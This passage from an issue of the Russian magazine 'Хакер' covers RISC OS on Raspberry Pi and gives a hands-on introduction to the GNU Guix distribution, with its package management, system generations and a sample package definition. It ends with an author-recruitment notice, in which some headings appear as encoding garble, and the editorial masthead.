 В 2010‐х «одноплатники» произвели в мире IT при мерно такую же револю‐
  цию, какую учинил в начале 1980‐х ZX Spectrum и подобные ему портативные
  персоналки, открыв шие доступ к компьютер ным технологиям каждому обы‐
  вателю. На базе Raspberry Pi, Orange Pi, Banana Pi и прочих фруктово‐ягодных
  изделий электронной промышленности стали воз никать многочисленные
  проекты игровых консолей, умных домов, мобильных роботов, медиацентров,
  сетевых хранилищ и мини‐серверов. Разумеется, одной из первых ОС
  под Raspberry Pi стал Linux, уже имеющий портированные ARM‐версии. И тут
 общественность наконец вспомнила о RISC OS, которая мало того что
  с самого начала разрабатывалась для процессоров ARM, так и написана
  по большому счету компанией — раз работчиком этих процессоров.
    Еще в 2006 году фирма Castle Technologies, которой по наследс тву переш‐
  ли права на RISC OS от Acorn, решила открыть для некоммерческого исполь‐
  зования ряд компонентов системы, ради чего был создан проект RISC OS
 Open Limited. На основе этих исходников в 2012 году собрали первую
  рабочую версию RISC OS для Raspberry Pi.
    Поскольку RISC OS — это нативная для ARM операционная система,
  основное ее преимущество заключается в быс трой загрузке и высоком быс‐
  тродействии на «малинке» по сравнению с дру гими портированными плат‐
 формами. При этом архитектура RISC OS имеет нес колько характерных осо‐
  бенностей:
  • ОС построена на принципе кооперативной многозадачности;
  • в файловой системе все файловые объекты представляют собой отдель‐
    ные тома;
  • архитектура приложений позволяет менять поведение системы с исполь‐
    зованием различных модулей;
  • сама ОС состоит из таких модулей, которые подключаются по мере необ‐
    ходимости.

 Модули могут играть роль и компонентов самой ОС, и драйверов, и биб‐
  лиотек, и пользовательских приложений. Сис темные вызовы к ним реали‐
  зованы с помощью программных прерыва ний. Из объ ективных минусов RISC
 OS следует отметить механизм разграничения прав пользовате лей… потому
  что его там попросту нет. Все юзеры логинят ся в систему и запускают при‐
 ложения от име ни суперпользователя, и сделать с этим ничего нельзя.
    Установка RISC OS на Raspberry Pi не представляет серьезных слож‐
  ностей и в целом аналогична про цеду ре инсталляции Raspbian: образ сис‐
 темы разворачивается на miniSD‐карту, после чего «малинку» можно запус‐
  тить уже с нее. Интерфейс RISC OS Pi остался неиз менным с самого начала
  девяностых, что обязатель но пораду ет ностальгирующих олдфагов, осталь‐
 ным же он может показаться несколько непривычным. С другой стороны,
  лаконичный интерфейс не требует серь езных аппа ратных ресурсов, что мож‐
  но отнести к достоинствам.





                       RISC OS на Raspberry Pi

 Контекстное меню здесь, нап ример, вызыва ется нажатием не правой кла‐
 виши мыши, а колесика или средней кноп ки, у кого она есть. Правая кнопка
  используется для дополнительных дей ствий, зависящих от при ложе ния.
  Некоторые программы запус каются свернутыми в трей, а чтобы развернуть
  окно, потребуется воспользовать ся контекстным меню. В RISC OS очень
 широко  используется  перетаскивание  объектов,  а  передача  фокуса
  в какое‐либо окно не означает, что оно непременно отобразится поверх дру‐
  гих окон: например, пользователь может набирать что‐то в разверну том
  на заднем плане текстовом редакторе, поверх которого открыто окошко бра‐
  узера.
    Нужно отметить, что в RISC OS Pi далеко не все работает из коробки —
  и это еще одно грустное нас ледие девяностых. Пос ле установки ОС придется
  воспользоваться значком Conﬁguration и нас троить параметры рабочего сто‐
  ла, включая количество цветов и час тоту монитора. Примечательно, что прос‐
  то указать нужное экранное разрешение система не поз воляет. Также при‐
  дется настроить парамет ры подключения к сети (для этого нужно перейти
  в раздел Conﬁguration → Network → Internet).
    Пару слов следует сказать об осо бенностях фай ловой системы RISC OS,
  которая решительно отличается от всего, с чем я сталкивался раньше.
  Как уже упоминалось, все файлы и папки там представлены в виде томов,
  при этом корневая папка смонтированного диска обозначается знаком дол‐
  лара ($). Расширений в RISC OS нет вовсе, а для того чтобы отличить один
 файл от другого, используются метаданные. Для отделения имени файловой
  системы от остального пути служит двоеточие, а папки отде ляются друг
  от друга точкой. Поскольку точка уже зарезервирова на в синтакси се сис темы,
  расширения файлов, созданных в дру гих ОС, в RISC OS записы ваются
  при помощи слеша. В общем, изу чение структуры файловой системы RISC
 OS — отличный способ сломать себе мозг.





             Игры и допол нитель ные приложения в RISC OS Pi

 Имена приложений начинаются в RISC OS с вос клицательного знака,
  при этом сами приложения физически представляют собой том‐контейнер,
  внутри которого хранится и сам исполняемый файл, и все необходимые
  для работы программы ресурсы. Кстати, о прог раммах.
   В комплекте поставки RISC OS Pi имеется минимальный набор приложе‐
  ний,  вклю чающий  калькулятор,  аудиоредактор,  примитивный  текстовый
  редактор, браузер !NetSurf и нес колько других ути лит. Список остального
  доступного для RISC OS софта можно найти вот здесь. Кроме того, некото‐
 рое количество программ предлага ется во встроенном магазине приложений
  !Store — бесплатно или за день ги. Допол нительный комплект софта можно
  отыскать на SD‐карте в папке Diversions, которая содержит парочку игр, вклю‐
  чая пасьянс «Косынка», «Сапер» и дру гую клас сику. Исходники компонентов
 ОС и ряда утилит есть на GitHub.





               Ну надо же — здесь есть пасьянс «Косынка»!


 ВМЕСТО ПОСЛЕСЛОВИЯ
  Так зачем все‐таки устанавливать RISC OS на Raspberry Pi? Во‐первых,
  это прикольно. Лич но мне всегда нравилось изу чать новые и незнакомые
  операционные системы, а RISC OS позволяет получить совершенно безум‐
 ный опыт.


         WWW

                        Большой объем полезной информации о RISC OS
                         для начинающих лежит на сайте svrsig.org. Здесь
                        собраны ответы практически на все возника ющие
                            у новичков вопросы — правда, только на англий‐
                        ском языке.


  Во‐вторых, можно начать программировать для RISC OS  Pi, создавать
  или портировать оконные приложения, совмести мые с ее графической под‐
  системой WIMP. Это поможет в раз витии про екта. Сейчас для RISC OS име‐
  ется базовый набор софта, и с каж дым днем ассортимент приложений рас‐
 ширяется. Самое время присоединиться. Для RISC OS можно писать прог‐
 раммы на C/C++ (с GCC), Charm, ARM BASIC и ARM Assembly.
    Уже сейчас поль зователь RISC OS может редактировать тексты, создавать
  несложные иллюстрации, серфить по интернету, писать и принимать сооб‐
 щения электронной почты, загружать и скачивать файлы по FTP. К сожалению,
  нет возможности просматривать потоковое видео из сети, но зато можно
  сохранить ролики и просмотреть их локально.
    Браузер NetSurf из ком плекта поставки работа ет очень быстро, однако
  не поддерживает некоторые функции, имеющиеся у других современных бра‐
  узеров. Для просмотра сайтов с JS пот ребуется установить Otter или QupZilla,
  но эти браузеры намного медленнее и неповоротливее NetSurf.
    Для RISC OS доступно некоторое количес тво игр, включая Hardware Ac‐
  cellerated Quake, использующий уско рение VideoCore  IV с поддержкой
  Khronos. Но качественных игру шек с хорошей гра фикой для этой системы все
 еще маловато. Тем не менее можно попытать ся превратить Raspberry Pi
  с RISC OS в игровой ретрокомпьютер и немного поностальгировать об ушед‐
 шей эпохе тридцатилетней давности. Небольшой обзор «рисковых» игру шек,
  которые идут на Raspberry Pi, можно найти на сайте вот этих ребят из Авс тра‐
  лии.
   Многие прин ципы вза имодействия с интерфей сом RISC OS наверняка
  покажутся непривычными пользователям Windows, Linux и macOS, поэтому
  для адаптации к этой системе потребуется время. Фанаты рекомендуют уста‐
  новить RISC OS на «малин ку» и пос мотреть, удастся ли решать на этой ОС те
 же задачи, с которыми успешно справляется Linux. В любом случае англо‐
  язычные сообщества пользователей RISC OS отличаются доброжелатель‐
  ностью и открытостью, а энтузиас ты с радостью помогут тебе отыс кать ответы
  на все возникающие вопросы.
GEEK
GNU GUIXSD

          ЗНАКОМИМСЯ
         С ОПЕРАЦИОНКОЙ
        НОВОГО ПОКОЛЕНИЯ





Роль участников проекта GNU в развитии
свободного  программно го  обеспечения
невозможно переоценить. Шелл по умол‐
чанию в большинстве UNIX‐подобных сис‐
тем — GNU bash, GCC — все так же один         Даниил Батурин                                                                                   Координатор проекта VyOS
из самых популярных компилято ров, а GNU        (https://vyos.io),функциональщик,«языковед»,иногда
Emacs — бессменный участник войн редак‐         сетевойdaniil@baturin.orgадминистратор
торов. При этом изна чальной цели про‐
екта — разработать свободную операци‐
онную систему — так до сих пор и не дос‐
тигли.


Проект был ведущим поставщиком компонентов UNIX‐подобных ОС, но боль‐
шая часть нов шеств в раз работке дистри бути вов GNU/Linux появлялась в не
связанных с GNU и FSF проектах, а их собственные дистрибути вы вроде
gNewSense не представляли особого интереса. Чаще все го они были вари‐
антами других дистрибутивов, очищенными от всего нес вободного кода.
  Многие участники проекта GNU, включая основателя проекта Ричарда
Стол лмана, также отли чались любовью к языкам семейства лисп. Неуди‐
вительно, если вспомнить, что основатели про екта работали в лаборатории
искусственного интеллекта в MIT вмес те с раз работчиками лисп‐машин.
При этом в самих операционных системах языки семейства лисп не занимали
особого места со времен тех самых лисп‐машин — их роль ограничивалась
приложениями.
  Проект GNU Guix (произносится geeks) меня ет дело на обоих фронтах.
Это не производная другого дистрибути ва, а независимый дистрибутив
со своим менеджером пакетов и Scheme — язы ком семейства лисп —
в качестве системного скриптового языка.
  В качестве системы управления сервисами Guix использует не SysV init
и не systemd, а GNU sheperd, который произошел из GNU/Hurd и также под‐
держивает Scheme в качестве языка описания сервисов.
  Тем не менее Guix появился не на пустом мес те. Пакетный менеджер Guix
основан на части кода Nix, расширяет его идеи и добавляет поддержку
Scheme в качестве языка описаний пакетов и конфигураций.


NIXOS — ИДЕЙНЫЙ ПРЕДШЕСТВЕННИК GUIX
Прежде чем обсуждать Guix, нужно кратко упомянуть о прогрессе в управле‐
нии пакетами и пионере их реализации — пакет ном менеджере Nix.
  Все популярные дистрибутивы используют отработанную еще в девянос‐
тых схему управле ния пакета ми. У каждого пакета есть версия, в каждый
момент в системе может быть только одна версия каждого пакета, обновле‐
ние пакета требует обновления всех его зависи мостей. Эта схе ма гораздо
лучше тех, когда каждый пакет пос тавляется вмес те со всеми зависимос тями
или когда все управление зависимос тями оста ется на совести пользователя.
Однако у нее есть существенные недос татки.
 • Иногда все же требуется держать в одной системе две разные версии
   одной программы, например для тес тирова ния.
 • При обновле нии дистрибутива может сложиться так, что один пакет тре‐
   бует новую версию зависимос тей, а дру гой с ней конфликтует и поль‐
   зователь вынужден выбирать, какой пакет оста вить.
 • Обновление системы — необ ратимое действие.
 • Отключение питания во время обновления может разрушить всю систему.

Эти проблемы обычно реша ются обходными путями — контейнерами, вир‐
туальными  окружениями,  снимками  файловой  системы.  Лучшие  ли
это решения из возможных? Есть ли способ разобраться с проблемой
на уровне управления пакетами? Авторы  Nix задались целью выяс нить
это экспериментально.
  Все установленные пакеты Nix уста навливаются в отдельные каталоги
с хешем пакета в имени вроде /nix/store/b6gvzjyb2pg0kjfwrjmg1vfh‐
h54ad73z‐firefox‐33.1/. При этом в отличие от AppImage и подобного, где
все зависимости хранятся вместе с приложением, одни пакеты Nix вполне
могут служить зависимостями для дру гих. Посколь ку разные версии изолиро‐
ваны друг от друга, обновление одного пакета и его зависимостей никогда
не сломает другие пакеты. Как в контейнерах, но с меньшим рас ходом места
на диске за счет общих зависимос тей.
  Кроме того, обновление системы — ато марная операция. Если во время
обновления выдернуть кабель питания, система пос ле перезагрузки окажет‐
ся в состоянии как до начала обновления. Более того, обновление можно
откатить назад.
   Что это — будущее управления пакета ми или тупиковый путь? Говорить
об этом пока рано. Сейчас контейнеры в моде и у Docker есть финансовая
поддержка крупных компаний, в то время как исследования управления
пакетами и разработка новых дистрибутивов держатся на голом энту зиазме.


ЯЗЫК ПРОГРАММИРОВАНИЯ SCHEME
Scheme — язык из семейства Lisp. Это семей ство весьма велико, и его языки
объединяет, по сути, одно общее свойство — тождественность кода и дан‐
ных, а значит, и неограниченно расширяемый синтаксис. Язык Clojure во мно‐
гом построен именно на идеях Scheme, а не Common Lisp.
  При этом сам Scheme оставался широко известным язы ком, но редко при‐
менялся на практике. Его использует культовая книга Structure and Interpreta‐
tion of Computer Programs, но на нем не написа но ни одной сколько‐нибудь
популярной программы. Некоторые программы поддержи вают его в качестве
скриптового (например, графичес кий редактор GIMP поддерживает Scheme
и Python). Но этим все и огра ничивается.
   Так что идея исполь зовать Scheme как фундаментальную часть ОС выг‐
лядит весьма радикально, но авторы Guix решились. Давай посмотрим, что
из этого вышло.


УСТАНОВКА И БАЗОВАЯ НАСТРОЙКА
Установка в VirtualBox не представляет никакой сложности. При загрузке
с ISO нас встречает вполне типичный псевдографичес кий установщик —
на этом этапе заметить отличия от других дистрибутивов сложно.





Если ты решишься попробовать на физическом железе, нужно учитывать, что
разработчики Guix — члены FSF, а зна чит, в поставке по умол чанию отсутству‐
ют все несвободные драйверы и прошивки.
  Под конец установки пользователь начинает понимать, куда попал, — нам
советуют искать базовые нас тройки в /etc/config.scm и показы вают файл
с выбранными при установке настройками.





Этот файл — скрипт на языке Scheme и хра нит ука занные при установке нас‐
тройки в виде S‐выражений.


;; This is an operating system configuration generated
;; by the graphical installer.


(use‐modules (gnu))
(use‐service‐modules desktop networking ssh xorg)


(operating‐system
  (locale "en_US.utf8")
  (timezone "America/Anchorage")
  (keyboard‐layout (keyboard‐layout "us"))
  (host‐name "guix")
  (users (cons* (user‐account
                  (name "xakep")
                  (comment "Xakep")
                  (group "users")
                  (home‐directory "/home/xakep")
                  (supplementary‐groups
                    '("wheel" "netdev" "audio" "video")))
                %base‐user‐accounts))
  (packages
    (append
      (list (specification‐>package "nss‐certs"))
      %base‐packages))
  (services
    (append
      (list (service xfce‐desktop‐service‐type)
            (service openssh‐service‐type)
            (set‐xorg‐configuration
              (xorg‐configuration
                (keyboard‐layout keyboard‐layout))))
      %desktop‐services))
  (bootloader
    (bootloader‐configuration
      (bootloader grub‐bootloader)
      (target "/dev/sda")
      (keyboard‐layout keyboard‐layout)))
  (swap‐devices (list "/dev/sda2"))
  (file‐systems
    (cons* (file‐system
             (mount‐point "/")
             (device
               (uuid "8f368be5‐0dee‐4bcc‐b9d2‐54c8f36a77ab"
                     'ext4))
             (type "ext4"))
           %base‐file‐systems)))

Главное преимущество языков семейства лисп — расширя емый синтаксис.
В этом файле operating‐system и прочее — не ключевые слова языка
или формата файла, а всего лишь макросы Scheme. Но пока мы оставим его
в стороне и посмотрим на уста новку пакетов из репозиториев.


УСТАНОВКА И ОБНОВЛЕНИЕ ПАКЕТОВ
Менеджер пакетов, как и сам дистрибутив, называ ется guix. Иногда, чтобы
отличать их, дистрибутив называют GuixSD (Guix System Distribution). В отли‐
чие от dpkg или rpm, guix отвечает и за уста новку пакетов, и за создание сис‐
темных конфигов из абс трактных высокоуровневых описаний. Также там нет
разделения на менеджер пакетов и инстру мент работы с репозиториями,
как dpkg/APT или rpm/yum.
  Для начала мы посмотрим, как использовать его в качестве менеджера
пакетов. Перед тем как что‐то обновлять или уста навливать, нужно обновить
метаданные репозиториев, подобно apt‐get update в Debian.
  Делается это командой guix  pull. Описания пакетов хранятся в Git,
и вместо традиционных подписей файлов с метаданными раз работчики
используют подписанные коммиты. Командой guix pull ‐‐news можно пос‐
мотреть сводку изменений со времени пос леднего обновления. Обновляет
все пакеты команда guix package ‐‐upgrade.
  Нужно сразу отметить, что в Guix возможна уста новка пакетов от имени
обычных пользователей — в их личный профиль. Более того, метаданные
репозиториев у каждого пользователя тоже свои.
  Для примера поставим очень полезную программу — GNU hello.


xakep@guix ~$ guix pull
xakep@guix ~$ guix install hello
guix install: warning: Consider running 'guix pull' followed by
'guix package ‐u' to get up‐to‐date packages and security updates.


The following package will be installed:
   hello 2.10


substitute: updating substitutes from 'https://ci.guix.gnu.org' ...
100.0%
The following derivation will be built:
   /gnu/store/8x0ck5izca92m13fslj7zrqdip87zvxc‐profile.drv
0.1 MB will be downloaded:
   /gnu/store/a462kby1q51ndvxdv3b6p0rsixxrgx1h‐hello‐2.10
The following profile hooks will be built:
   /gnu/store/0m4z25sqnaln6k7wmf59cd4a7ic58da6‐ca‐certificate‐bun‐
dle.drv
   /gnu/store/9hn49fix4wr27djhcmq3d01ihgfc7aij‐fonts‐dir.drv
   /gnu/store/9k1xsdbk7nmh7iv2dj3dv0a3zmx0bf70‐manual‐database.drv
   /gnu/store/z5i1s0k76zgk9wkqazw1rnz6yirzpylz‐info‐dir.drv
downloading from https://ci.guix.gnu.org/nar/lzip/a462kby1q51ndvxd‐
v3b6p0rsixxrgx1h‐hello‐2.10 ... hello‐2.10  51KiB
...
building profile with 1 package...

Что значит updating substitutes? В терминологии Guix так называются соб‐
ранные двоичные пакеты. «Основным» способом установки считается сборка
пакетов из исходников, но для удобства и экономии ресурсов поддерживает‐
ся и установка двоичных пакетов как «суррогат» локальной сборки. Несмотря
на такое уничижительное название, никаких осо бых недос татков у двоичных
пакетов нет, и оба метода установки равноправны. Guix фокусируется на вос‐
производимости окружений сборки и исполня емых файлов, поэтому при чин
бояться локальной сборки тоже нет. С опцией ‐‐no‐substitutes Guix игно‐
рирует двоичные  пакеты, даже если они доступны, и собирает  пакет
из исходников.
  Исполняемый файл окажется в /home/xakep/.guix‐profile/bin/hello.
Эта установка пакета будет дос тупна только нашему пользователю xakep.
Другие пользователи вполне могут держать другую версию в своем профиле,
и обновление другим пользователем сво его пакета никак не затронет наш.
Даже у root’а есть свой профиль — установка от его име ни еще не значит гло‐
бальную установку для всех.
  Поиск пакетов организован неп ривычно и на первый взгляд крайне
неудобно. Команда guix search ищет совпадения во всех полях описания
пакетов и не предоставляет никаких фильтров. Поиск по guix search hello
выдает изрядное количес тво совершенно не относящихся к делу результатов
из‐за сов падений в описаниях. На самом деле это не баг, прос то следование
философии UNIX иногда принимает причудливые формы. В качестве фильтра
для результатов поиска авторы рекомендуют GNU recutils. Фор мат recﬁle —
это текстовый формат для прос тых баз данных (его можно описать как YAML
с однозначной грамматикой), а утилита recsel — инстру мент для работы
с ним. К примеру, командой guix search hello | recsel ‐p name,synop‐
sis можно ограничить вывод полями с именем и коротким описанием, как это
делают большинство других менеджеров пакетов. С опцией ‐e можно
использовать для поиска регулярные выражения POSIX.
  Подход, безусловно, гиб кий, но крайне необычный. Мне хочется верить,
что другие менеджеры пакетов добавят машиночитаемый вывод — и что Guix
сделает свой поиск проще.
  Просмотреть информацию об установленном пакете можно командой
guix package ‐I.


$ guix package ‐I hello
hello   2.10    out /gnu/store/a462kby1q51ndvxdv3b6p0rsixxrgx1h‐hel‐
lo‐2.10

Удалить пакет — командой guix package ‐r (‐‐remove).


ОБНОВЛЕНИЕ СИСТЕМЫ И КОНФИГУРАЦИИ
В Guix управление пакетами тес но свя зано с управлением конфигурацией.
Каждое обновление системы с помощью guix package ‐‐upgrade создает
новое «поколение» (generation) сос тояния системы.


xakep@guix ~$ sudo guix system list‐generations
Generation 1    Jun 22 2020 07:45:03
  file name: /var/guix/profiles/system‐1‐link
  canonical file name: /gnu/store/xqy25i9sfmznd5b1sw5n4155i8v0l2xc‐
system
  label: GNU with Linux‐Libre 5.4.31
  bootloader: grub
  root device: UUID: 8f368be5‐0dee‐4bcc‐b9d2‐54c8f36a77ab
  kernel: /gnu/store/g56i8savnfr7981fil03idkjl0syj29d‐linux‐libre‐
5.4.31/bzImage
  configuration file: /gnu/store/cbn7d14kpv7a6agab3x1fm4mxrm4yzl5‐
configuration.scm

Командой sudo guix system roll‐back можно отка тить систему к предыду‐
щему состоянию, если с обновлением что‐то пошло не так. Но и это еще
не все: команда guix system switch‐generation $number позволя ет отка‐
тить ее к любому предыдущему состоянию, не только последне му.
  Очевидно, держать большое количес тво снимков системы на диске нак‐
ладно. Командой sudo guix delete‐generations $num можно удалить сос‐
тояние с указанным номером, а этой же командой без аргумента — все сос‐
тояния, кроме текущего. Полезно также помнить про команду sudo guix gc.
Ей можно принудительно удалить все неисполь зуемые данные, оставшиеся
от прошлых поколе ний.
   Теперь вернемся к файлу настроек /etc/config.scm. В нем хранятся все
настройки системы, которыми управляет сам Guix, от имени хос та до спис ка
вклю ченных сервисов. В чем‐то это похоже на rc.conf из систем BSD, но с
куда более структурированным синтаксисом. Дос тупные опции описаны в ру‐
ководстве.
  Применить настрой ки пос ле редактирова ния фай ла можно командой sudo
guix system reconfigure /etc/config.scm. Эта команда создаст новое
«поколение» состояния системы. Как и обновление пакетов, эти изменения
можно откатить. Это существенно умень шает потребность в инс трументах
вроде Ansible.
  В то же время и возможнос тей управлять настройками вручную в Guix куда
меньше. Традиционные команды вро де useradd оказываются бесполез ными:
guix system reconfigure приведет сос тояние системы в полное соответс‐
твие с файлом /etc/config.scm и удалит все, что ты создал руками.


СОЗДАНИЕ ПАКЕТОВ
Описания пакетов в Guix тоже пишутся с исполь зованием макросов Scheme.
Хорошее введение можно найти в пос те A packaging tutorial for Guix. Мы
не будем рассматривать создание дополнитель ных репозиториев и вместо
этого воспользуемся воз можностью установить пакет из локального файла
с описанием.
  Для примера возьмем генератор ста тических блогов blogc. Он не требует
никаких    зависимостей   и    использует    стандартную   процедуру
./configure && make && make install, что сильно упрощает дело.
  Сначала нам нужно получить хеш пакета. Стандартная sha256sum выводит
хеш в Base64, а Guix по каким‐то причинам предпочитает Base32. К счастью,
вычисление хешей в нужном формате — встроенная функция.


xakep@guix ~$ wget
https://github.com/blogc/blogc/releases/download/v0.19.0/blogc‐
0.19.0.tar.xz
xakep@guix ~$ guix hash ‐‐hash= sha256 ./blogc‐0.19.0.tar.xz
1vr4772ivckaisplwcngfilkq2cnzbdjf326mj7l84r5x3nxw2dl

Теперь напишем файл описания пакета по аналогии с пос том.


(define‐module (gnu packages hope)
  #:use‐module (guix packages)
  #:use‐module (gnu packages)
  #:use‐module (guix download)
  #:use‐module (guix build‐system gnu)
  #:use‐module (guix licenses))


(package
  (name "blogc")
  (version "0.19.0")
  (source (origin
            (method url‐fetch)
            (uri (string‐append "https://github.com/blogc/blogc/
releases/download/v0.19.0/blogc‐" version
                                ".tar.xz"))
            (sha256 (base32
"1vr4772ivckaisplwcngfilkq2cnzbdjf326mj7l84r5x3nxw2dl"))))
  (build‐system gnu‐build‐system)
  (synopsis "blogc: a static blog generator")
  (description "blogc is a blog compiler. It compiles source files
and templates into blog/website resources. ")
  (home‐page "https://blogc.rgm.io/")
  (license bsd‐3))

Осталось сохранить его в файл. Имя файла не имеет значения, вся информа‐
ция хранится внутри. Назовем его blogc.scm и выпол ним guix package ‐‐
install‐from‐file=blogc.scm. Теперь команда blogc доступна текуще му
пользователю.
  Просмотреть и даже поп равить опи сание любого установленного пакета
можно командой guix edit $packageName. Очень помогает в написании
файлов по аналогии.


ЗАКЛЮЧЕНИЕ
Рекомендовать столь необычный и во многом экспериментальный дистри‐
бутив для широкого применения явно рано, но и обойти стороной тоже
невозможно.
  Самый заметный недос таток — требования к месту на диске. Клас сичес‐
кие менеджеры пакетов создавались с целью сделать как можно больше биб‐
лиотек и данных общими для всех пакетов и таким образом сэкономить мес‐
то. Подход Nix и Guix уничтожает это преимущес тво. С другой стороны, он
заметно уменьшает потребность в резервных копиях системы и отдельных
решениях для установки программ от имени пользовате ля, так что это скорее
компромисс, чем недос таток.
  Более замет ный минус — склонность Guix принудительно синхронизи‐
ровать состояние системы с пос ледни ми репозиториями, когда его об этом
не просят. Во многих случаях редактирование нас троек в /etc/config.scm
и выполнение guix system reconfigure /etc/config.scm «заодно» про‐
изводит обновление сис темы, если оно не совпадает с данными из пос‐
леднего guix pull. Хочется верить, что авторы это исправят.
  В официальных репозиториях почти 14 тысяч пакетов. Для независимого
дистрибутива доволь но внушительно, и все основное там есть, но с более
популярными дистрибутивами не сравнить, осо бенно когда дело касается
несвободного ПО — увы, порой без него трудно обойтись.
  Сложность ручного управления нас тройками для одних людей и сценариев
применения — явный недостаток, а для дру гих — огромное преимущес тво.
Ну и Scheme как системный язык — это весь ма смелое решение, хотя у поль‐
зователей куда более популярного Clojure с его изу чением не будет никаких
проблем.
  В целом каждый в итоге реша ет сам, но посмотреть на новые идеи всегда
интересно.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №06 (255)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                         РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                             РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
